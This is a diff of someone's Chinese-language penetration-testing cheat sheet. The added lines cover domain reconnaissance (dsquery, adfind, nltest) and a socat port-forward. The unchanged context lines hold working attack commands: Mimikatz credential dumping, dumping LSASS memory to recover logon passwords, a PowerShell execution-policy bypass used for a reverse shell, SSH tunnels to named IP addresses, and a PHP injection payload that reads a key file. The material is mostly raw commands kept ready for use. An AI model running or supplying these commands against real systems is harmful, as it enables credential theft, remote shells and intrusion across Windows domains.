@@ -31,9 +31,6 @@ net use c: /del
 net use * /del
 
 
-dsquery server        #查看域控服务器
-dsquery subnet        #查看域IP范围
-
 2 第二种方式是把 powershell 文件上传到堡垒机本地执行， powershell.exe ". .\Invoke-Mimikatz.ps1; Invoke-Mimikatz –DumpCreds"
 													   powershell.exe ". .\Out-Minidump.ps1;Get-Process lsass|Out-Minidump" 将导出的dmp文件，传回本地，sekurlsa::minidump xxx.dmp  sekurlsa::logonPasswords就可以得到密码
 													   PowerShell.exe -exec Bypass -File .\runme.ps1 可以用于反弹shell
@@ -78,11 +75,15 @@ ssh -C -f -N -g -L 80:174.139.9.66:8080     master@174.139.9.66
 ssh -C -f -N -g -R 80:174.139.9.66:8080            master@174.139.1.67在本机运行
 %windir%\SysWoW64\cmd.exe /c cscript exp.vbs /e db.mdb export.txt
 
+3.socat TCP-LISTEN:2222,fork TCP:172.17.0.2:22
+
 docker,git,wooyun,shell,powershell
 http://www.njstu.net/69394.html
 https://www.draw.io/
 ssh -T user@localhost /bin/bash -i
 
+205.171.3.65
+205.171.2.65
 
 php双引号${${phpinfo();}} php://filter/read=convert.base64-encode/resource=../key.php
 python -m SimpleHTTPServer 233
@@ -227,4 +228,17 @@ highlight_file('test.php');
 信息收集（Exfiltration）
 信息侦察（Recon）
 
-https://klionsec.github.io/2017/07/31/socat-meterpreter/ socat 端口转发
+https://xianzhi.aliyun.com/forum/read/1882.html  Active Directory中获取域管理员权限的攻击方法
+
+
+内网信息收集：
+dsquery
+dsquery server        #查看域控服务器
+dsquery subnet        #查看域IP范围
+
+
+adfind LDAP查询
+
+
+nltest 来测试一个域中的域控制器和运行Windows NT的域成员之间的信任关系
+NTLTEST使用可以参考：http://technet.microsoft.com/zh-cn/library/cc731935
